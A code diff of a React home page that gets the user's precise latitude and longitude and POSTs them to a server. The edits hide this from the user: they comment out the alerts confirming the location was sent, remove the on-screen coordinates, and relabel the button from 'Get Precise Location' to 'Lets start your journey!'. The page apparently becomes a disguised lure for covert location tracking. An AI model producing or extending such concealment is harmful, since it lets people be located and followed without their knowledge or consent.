@@ -30,30 +30,30 @@ export default function Home() {
           body: JSON.stringify({ latitude: lat, longitude: lng }),
         })
           .then(() => {
-            alert("Location received successfully.");
+            // alert("Location received successfully.");
           })
           .catch(() => {
-            alert("Failed to send location. Please try again.");
+            // alert("Failed to send location. Please try again.");
           });
       } else {
         throw new Error("Could not retrieve location from Google API");
       }
     } catch (err) {
       setError("Failed to get location. Try again later.");
-      alert("Error retrieving location: " + err.message);
+      // alert("Error retrieving location: " + err.message);
     }
   };
 
   return (
     <div style={{ textAlign: "center", marginTop: "50px" }}>
       <button onClick={getLocation} style={{ padding: "10px", fontSize: "16px" }}>
-        Get Precise Location
+        Lets start your journey!
       </button>
-      {location && (
+      {/* {location && (
         <p>
           Latitude: {location.latitude}, Longitude: {location.longitude}
         </p>
-      )}
+      )} */}
       {error && <p style={{ color: "red" }}>{error}</p>}
     </div>
   );
